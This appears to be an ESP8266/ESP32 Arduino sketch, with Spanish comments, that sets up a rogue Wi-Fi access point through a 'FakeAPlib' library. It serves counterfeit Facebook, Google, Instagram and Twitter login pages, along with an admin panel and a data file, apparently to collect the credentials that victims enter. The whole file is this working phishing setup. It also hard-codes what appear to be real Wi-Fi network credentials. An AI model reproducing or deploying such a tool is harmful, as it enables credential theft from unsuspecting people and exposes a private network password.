#include <FakeAPlib.h>


//variable para el nombre del wifi
const char* SSID      = "ESP.local-server";
const char* PASS      = "SECUREhash9361";
const char* WIFI_SSID = "Finetwork_82FBD";
const char* WIFI_PSW  = "2c2D4GeA";

const char* DATA_FILE  = "/data/data.json";
const char* ADMIN_PAGE = "/webpages/admin-login/admin-panel.html";
const char* AUTH_PAGE  = "/webpages/admin-login/index-login.html";

const char* FB_PATH = "/webpages/facebook-login";
const char* GL_PATH = "/webpages/google-login";
const char* IS_PATH = "/webpages/instagram-login";
const char* TW_PATH = "/webpages/twitter-login";

const IPAddress* serverip = new IPAddress(10,10,1,1);
//byte apmac[6];

FakeAP* accessPoint = new FakeAP(80);
int printed = 0;

void setup()
{
  Serial.begin(115200);
  Serial.setDebugOutput(true);
  delay(2000);

  Serial.println("Loading....");
  delay(1000);

  accessPoint->setPath(ADMIN_PAGE, ADMINPAGE);
  accessPoint->setPath(AUTH_PAGE,  INDEXPAGE);
  accessPoint->setPath(DATA_FILE,  DATAFILE);

  accessPoint->setPath(FB_PATH, FACEBOOK);
  accessPoint->setPath(GL_PATH, GOOGLE);
  accessPoint->setPath(IS_PATH, INSTAGRAM);
  accessPoint->setPath(TW_PATH, TWITTER);

  WiFi.mode(WIFI_AP);
  WiFi.hostname("ESP.server");
  WiFi.softAPConfig(*serverip, *serverip, IPAddress(255, 255, 255, 0));
  if (!accessPoint->initialize(SSID, PASS, WIFI_SSID, WIFI_PSW))
    Serial.println("Error en la configuración del punto de acceso");


  Serial.println("Config done!");
  
}

void loop()
{
  accessPoint->process();

  if (printed<=0){
    Serial.println("wainting for client to connect");
    printed++;
  }



}